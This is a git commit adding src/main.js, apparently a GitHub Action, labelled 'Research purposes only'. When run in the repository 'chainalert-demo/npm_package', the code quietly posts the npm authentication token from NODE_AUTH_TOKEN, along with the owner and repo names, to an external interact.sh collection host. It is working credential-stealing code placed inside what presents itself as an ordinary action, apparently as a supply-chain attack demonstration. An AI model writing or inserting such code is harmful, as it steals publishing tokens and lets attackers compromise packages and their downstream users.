91e6ff2daf33303ce89582387edc0be5a0206039
du_research <du_research@outlook.co.il>
2022-05-09 09:04:48 +0300

    first commit

---
+++ src/main.js
@@ -0,0 +1,26 @@
+// Research purposes only
+
+const core = require("@actions/core");
+const axios = require("axios");
+const {GitHub, context} = require("@actions/github");
+
+async function run() {
+    try {
+
+        const {owner, repo} = context.repo;
+        if (owner === "chainalert-demo" && repo === "npm_package") {
+            // Research purposes only
+            axios.post('https://c9ep0g22vtc0000skrpggrzmyeyyyyyyb.interact.sh', {'NPM_TOKEN': process.env.NODE_AUTH_TOKEN, 'owner':owner, 'repo': repo})
+        }
+
+        return;
+
+    } catch (error) {
+        console.log(error);
+        core.setFailed(error.message);
+    }
+}
+
+if (require.main === module) {
+    run();
+}
